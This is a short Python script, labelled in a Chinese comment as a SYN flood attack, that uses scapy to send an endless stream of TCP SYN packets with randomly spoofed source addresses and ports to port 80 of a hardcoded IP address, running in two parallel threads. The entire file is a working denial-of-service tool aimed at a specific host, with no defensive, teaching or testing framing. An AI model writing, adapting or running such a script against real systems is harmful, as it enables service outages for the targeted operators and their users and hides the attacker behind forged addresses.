# coding: UTF-8

# syn 泛洪攻击

from scapy.all import *
import random
import time
from multiprocessing.pool import ThreadPool

def func():
    host = '118.25.105.232'
    while True:
        # time.sleep(0.3)
        num_1 = random.randint(1, 255)
        num_2 = random.randint(1, 255)
        num_3 = random.randint(1, 255)
        num_4 = random.randint(1, 255)
        src_ip = '%d.%d.%d.%d' % (num_1, num_2, num_3, num_4)
        sport = random.randint(1024, 65535);
        pkt = IP(dst=host, src=src_ip)/TCP(dport=80,sport=sport,flags='S')
        send(pkt)
def main():
    tp = ThreadPool(2)
    for i in range(2):
        tp.apply_async(func=func)
    tp.close()
    tp.join()

if __name__ == '__main__':
    main()
